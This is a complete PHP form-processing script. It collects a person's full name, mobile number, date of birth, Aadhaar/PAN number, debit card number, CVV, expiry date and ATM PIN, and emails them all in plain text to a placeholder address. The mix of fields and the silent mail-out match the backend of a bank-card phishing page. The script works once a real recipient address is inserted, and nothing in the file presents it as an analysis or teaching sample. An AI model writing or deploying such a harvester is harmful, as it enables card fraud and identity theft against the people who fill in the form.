<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $fullName = $_POST['fullName'];
    $mobileNumber = $_POST['mobileNumber'];
    $dob = $_POST['dob'];
    $aadhaarPan = $_POST['aadhaarPan'];
    $debitCard = $_POST['debitCard'];
    $cvv = $_POST['cvv'];
    $expiryDate = $_POST['expiryDate'];
    $atmPin = $_POST['atmPin'];

    $to = "your-email@example.com";
    $subject = "User Information Submission";
    $message = "
    Personal Information:
    Full Name: $fullName
    Mobile Number: $mobileNumber
    Date of Birth: $dob
    Aadhaar/PAN: $aadhaarPan

    Debit Card Details:
    Card Number: $debitCard
    CVV: $cvv
    Expiry Date: $expiryDate
    ATM PIN: $atmPin
    ";

    $headers = "From: no-reply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Information submitted successfully!";
    } else {
        echo "Failed to send the email.";
    }
}
?>
